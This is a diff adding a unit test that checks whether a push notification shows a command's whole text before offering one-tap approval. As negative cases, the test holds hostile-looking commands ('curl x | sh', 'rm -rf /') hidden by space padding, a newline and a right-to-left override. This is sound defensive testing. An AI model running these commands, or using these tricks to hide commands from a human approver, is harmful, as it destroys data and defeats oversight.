@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import type { Notification } from "./notifications.ts";
-import { deviceWants, isQuiet, pushMessage } from "./push.ts";
+import { PUSH_APPROVE_MAX, approvesOnPush, deviceWants, isQuiet, pushMessage } from "./push.ts";
 
 const notification: Notification = {
   id: 7,
@@ -22,6 +22,26 @@ const notification: Notification = {
 // 2026-10-28 23:30 in Jerusalem (UTC+2).
 const night = Date.parse("2026-10-28T21:30:00Z");
 const quiet = { start: 22 * 60, end: 7 * 60, timeZone: "Asia/Jerusalem" };
+
+describe("Approve on a push (K-1722)", () => {
+  it("offers Approve only when the push shows the whole hashed text", () => {
+    expect(approvesOnPush('run on vps: "docker system prune -af"')).toBe(true);
+    expect(approvesOnPush("x".repeat(PUSH_APPROVE_MAX))).toBe(true);
+    for (const hidden of [
+      "x".repeat(PUSH_APPROVE_MAX + 1),
+      // Spaces push the rest out of sight.
+      `run on vps: "df -h${" ".repeat(30)}&& curl x | sh"`,
+      "run on vps\nrm -rf /",
+      'run on vps:\t"df"',
+      // A right-to-left override shows the text in another order.
+      'run on vps: ‮"hs | x lruc"',
+      'run on vps: "café"',
+      " leading space",
+      "",
+    ])
+      expect(approvesOnPush(hidden), JSON.stringify(hidden)).toBe(false);
+  });
+});
 
 describe("Web Push (K-1907)", () => {
   it("keeps quiet hours in the time zone of the device, also over midnight", () => {
